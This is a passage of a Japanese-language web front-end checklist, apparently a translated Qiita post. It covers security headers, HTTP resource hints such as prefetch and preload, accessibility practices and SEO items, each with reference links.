<li>📖 <a href="https://tools.ietf.org/html/rfc7034" rel="nofollow noopener" target="_blank">RFC7034 - HTTP Header Field X-Frame-Options</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Content Security Policy</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> Content Security Policy によってあなたのサイトで、コンテンツがどのように読み込まれるか、許可されている場所から読み込まれているかなどを定義している。これはクリックジャッキング攻撃等からも防御することができる。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://scotthelme.co.uk/content-security-policy-an-introduction/" rel="nofollow noopener" target="_blank">Content Security Policy - An Introduction - Scott Helme</a>
</li>
<li>📖 <a href="https://scotthelme.co.uk/csp-cheat-sheet/" rel="nofollow noopener" target="_blank">CSP Cheat Sheet - Scott Helme</a>
</li>
<li>📖 <a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet" rel="nofollow noopener" target="_blank">CSP Cheat Sheet - OWASP</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="パフォーマンス-1" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9-1"><i class="fa fa-link"></i></a>パフォーマンス</h2>

<h3>
<span id="ベストプラクティス-4" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-4"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ページの重さ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> それぞれのページの重さは 500 KB以下である。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://tools.pingdom.com" rel="nofollow noopener" target="_blank">Website Page Analysis</a>
</li>
<li>📖 <a href="https://evilmartians.com/chronicles/size-limit-make-the-web-lighter" rel="nofollow noopener" target="_blank">Size Limit: Make the Web lighter</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>Minified HTML:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> HTML が圧縮 (Minify) されている。</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>Lazy loading:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 画像やスクリプト、CSS は、レスポンス時間を改善するために遅延ロードされている。（それぞれのセクションで詳細をみてください。）</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>Cookie size:</strong> もし Cookie を使用しているなら、4096 バイトを超えていないこと、20以上の Cookie を使用していないこと。</p></li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://tools.ietf.org/html/rfc6265" rel="nofollow noopener" target="_blank">Cookie specification: RFC 6265</a>
</li>
<li>📖 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" rel="nofollow noopener" target="_blank">Cookies</a>
</li>
<li>🛠 <a href="http://browsercookielimits.squawky.net/" rel="nofollow noopener" target="_blank">Browser Cookie Limits</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Third party components:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 外部の JS に依存するサードパーティの iframe やコンポーネントは（例えばソーシャル共有ボタン）、可能な限りスタティックなコンポーネントに置き換えられるべきである。これによって外部 API の呼び出しに制限を与えることができ、ユーザーのプライバシーを保護することができる。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://simplesharingbuttons.com/" rel="nofollow noopener" target="_blank">Simple sharing buttons generator</a>
</li>
</ul>
</blockquote>

<h3>
<span id="http-リクエストの最適化" class="fragment"></span><a href="#http-%E3%83%AA%E3%82%AF%E3%82%A8%E3%82%B9%E3%83%88%E3%81%AE%E6%9C%80%E9%81%A9%E5%8C%96"><i class="fa fa-link"></i></a>HTTP リクエストの最適化</h3>

<blockquote>
<ul>
<li>📖 <a href="https://css-tricks.com/prefetching-preloading-prebrowsing/" rel="nofollow noopener" target="_blank">Explanation of the following techniques</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>DNS resolution:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> サードパーティーサービスの DNS には <code>dns-prefetch</code> を使用して、アイドル時間中に名前解決を行う。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"dns-prefetch"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Preconnection:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> サードパーティーサービスの DNS ルックアップ、TCP ハンドシェイク及び TLS ネゴシエーションには、<code>preconnect</code> を使用してアイドル時間中に事前に行われている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"preconnect"</span> <span class="na">href</span><span class="o">=</span><span class="s">"https://example.com"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Prefetching:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> すぐに必要になりそうなリソース（たとえば遅延ロードを行なっている画像）は、<code>prefetch</code> を使用してアイドル時間中にリクエストを行なっている。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"prefetch"</span> <span class="na">href</span><span class="o">=</span><span class="s">"image.png"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Preloading:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> そのページで必要なリソース（たとえば <code>&lt;body&gt;</code> の最後に設置されているスクリプトなど）には <code>preload</code> を使用している。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"preload"</span> <span class="na">href</span><span class="o">=</span><span class="s">"app.js"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://medium.com/reloading/preload-prefetch-and-priorities-in-chrome-776165961bbf" rel="nofollow noopener" target="_blank">Difference between prefetch and preload</a>
</li>
</ul>
</blockquote>

<h3>
<span id="パフォーマンステスト" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>パフォーマンステスト</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Google PageSpeed:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> ホームページだけでなく、すべてのページがテストされており、90-100 のスコアであること。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://developers.google.com/speed/pagespeed/insights/" rel="nofollow noopener" target="_blank">Google PageSpeed</a>
</li>
<li>🛠 <a href="https://testmysite.withgoogle.com" rel="nofollow noopener" target="_blank">Test your mobile speed with Google</a>
</li>
<li>🛠 <a href="https://www.webpagetest.org/" rel="nofollow noopener" target="_blank">WebPagetest - Website Performance and Optimization Test</a>
</li>
<li>🛠 <a href="https://gtmetrix.com/" rel="nofollow noopener" target="_blank">GTmetrix - Website speed and performance optimization</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="アクセシビリティ" class="fragment"></span><a href="#%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B7%E3%83%93%E3%83%AA%E3%83%86%E3%82%A3"><i class="fa fa-link"></i></a>アクセシビリティ</h2>

<blockquote>
<p><strong>Notes:</strong> You can watch the playlist <a href="https://www.youtube.com/playlist?list=PLNYkxOF6rcICWx0C9LVWWVqvHlYJyqw7g" rel="nofollow noopener" target="_blank">A11ycasts with Rob Dodson</a> 📹</p>
</blockquote>

<h3>
<span id="ベストプラクティス-5" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-5"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>プログレッシブエンハンスメント:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 主要な機能、たとえばメインナビゲーションや検索などは、JavaScript 無しでも動作しなければならない。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.youtube.com/watch?v=kBmvq2cE0D8" rel="nofollow noopener" target="_blank">Enable / Disable JavaScript in Chrome Developer Tools</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Color contrast:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> カラーコントラストは WCAG のレベル AA を満たしている。（モバイル向けには AAA）</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://leaverou.github.io/contrast-ratio/" rel="nofollow noopener" target="_blank">Contrast ratio</a>
</li>
</ul>
</blockquote>

<h4>
<span id="見出し" class="fragment"></span><a href="#%E8%A6%8B%E5%87%BA%E3%81%97"><i class="fa fa-link"></i></a>見出し</h4>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>H1:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 全てのページには、サイトのタイトルとは違う H1 がある。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Headings:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 見出しは正しい順序で適切に使用されている。（H1 から H6）</li>
</ul>

<blockquote>
<ul>
<li>📹 <a href="https://www.youtube.com/watch?v=vAAzdi1xuUY&amp;index=9&amp;list=PLNYkxOF6rcICWx0C9LVWWVqvHlYJyqw7g" rel="nofollow noopener" target="_blank">Why headings and landmarks are so important -- A11ycasts #18</a>
</li>
</ul>
</blockquote>

<h4>
<span id="ランドマーク" class="fragment"></span><a href="#%E3%83%A9%E3%83%B3%E3%83%89%E3%83%9E%E3%83%BC%E3%82%AF"><i class="fa fa-link"></i></a>ランドマーク</h4>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Role banner:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>&lt;header&gt;</code> には <code>role="banner"</code> がある。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Role navigation:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>&lt;nav&gt;</code> には <code>role="navigation"</code> がある。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Role main:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>&lt;main&gt;</code> には <code>role="main"</code> がある。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://www.w3.org/WAI/GL/wiki/Using_ARIA_landmarks_to_identify_regions_of_a_page" rel="nofollow noopener" target="_blank">Using ARIA landmarks to identify regions of a page</a>
</li>
<li>📖 <a href="https://www.w3.org/TR/wai-aria/roles#roles_categorization" rel="nofollow noopener" target="_blank">ARIA roles categorization</a>
</li>
</ul>
</blockquote>

<h3>
<span id="セマンティック" class="fragment"></span><a href="#%E3%82%BB%E3%83%9E%E3%83%B3%E3%83%86%E3%82%A3%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a>セマンティック</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>適切な HTML5 <code>input</code> タイプが使用されている:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> これは、キーパッドやウィジェットが様々なタイプにカスタマイズされるモバイルデバイスでは特に重要である。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="http://mobileinputtypes.com/" rel="nofollow noopener" target="_blank">Mobile Input Types</a>
</li>
</ul>
</blockquote>

<h3>
<span id="フォーム" class="fragment"></span><a href="#%E3%83%95%E3%82%A9%E3%83%BC%E3%83%A0"><i class="fa fa-link"></i></a>フォーム</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Label:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>label</code> は、それぞれのフォーム要素に関連づけられている。もし <code>label</code> を表示できない場合には <code>aria-label</code> を使用する。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/ARIA_Techniques/Using_the_aria-label_attribute" rel="nofollow noopener" target="_blank">Using the aria-label attribute - MDN</a>
</li>
</ul>
</blockquote>

<h3>
<span id="アクセシビリティテスト" class="fragment"></span><a href="#%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B7%E3%83%93%E3%83%AA%E3%83%86%E3%82%A3%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>アクセシビリティテスト</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>アクセシビリティスタンダードテスト:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> もしアクセシビリティスタンダードに準拠するなら、WAVE ツールを使用してテストを行うことができる。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="http://wave.webaim.org/" rel="nofollow noopener" target="_blank">Wave testing</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>キーボード操作:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのインタラクティブな要素に到達可能で使用可能であることが、目に見える順序でキーボードだけを使ってテストされている。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>スクリーンリーダー:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> すべてのページはスクリーンリーダーでテストされている。（VoiceOver, ChromeVox, NVDA or Lynx）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>フォーカススタイル:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> もし、フォーカスが無効化されているなら、CSS による状態の可視化に置き換えられている。</li>
</ul>

<blockquote>
<ul>
<li>📹 <a href="https://www.youtube.com/watch?v=srLRSQg6Jgg&amp;index=5&amp;list=PLNYkxOF6rcICWx0C9LVWWVqvHlYJyqw7g" rel="nofollow noopener" target="_blank">Managing Focus - A11ycasts #22</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="seo" class="fragment"></span><a href="#seo"><i class="fa fa-link"></i></a>SEO</h2>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Google Analytics:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> Google Analytics がインストールされており、正しく設定されている。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>見出し構造:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 見出し用のテキストが、そのページの内容を理解することの手助けになっている。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>sitemap.xml:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>sitemap.xml</code> が存在しており Google Search Console に登録されている。（旧 Google Webmaster Tools）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>robots.txt:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>robots.txt</code> によってブロックされていないこと。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://varvy.com/robottxt.html" rel="nofollow noopener" target="_blank">The robots.txt file</a>
</li>
<li>🛠 Test your robots.txt with <a href="https://www.google.com/webmasters/tools/robots-testing-tool" rel="nofollow noopener" target="_blank">Google Robots Testing Tool</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>構造化データ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 構造化データを使用しており、エラーがないことをテストされている。構造化データはクローラーがそのページのコンテンツを理解するための手助けになっている。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://developers.google.com/search/docs/guides/intro-structured-data" rel="nofollow noopener" target="_blank">Introduction to Structured Data - Search - Google Developers</a>
</li>
<li>📖 <a href="https://rdfa.info/" rel="nofollow noopener" target="_blank">RDFa - Linked Data in HTML</a>
</li>
<li>📖 <a href="https://json-ld.org/" rel="nofollow noopener" target="_blank">JSON-LD</a>
</li>
<li>📖 <a href="https://www.w3.org/TR/microdata/" rel="nofollow noopener" target="_blank">Microdata</a>
</li>
<li>🛠 Test your page with the <a href="https://developers.google.com/structured-data/testing-tool/" rel="nofollow noopener" target="_blank">Structured Data Testing Tool</a>
</li>
<li>🛠 Complete list of vocabularies that can be used as structured data. <a href="http://schema.org/docs/full.html" rel="nofollow noopener" target="_blank">Schema.org Full Hierarchy</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
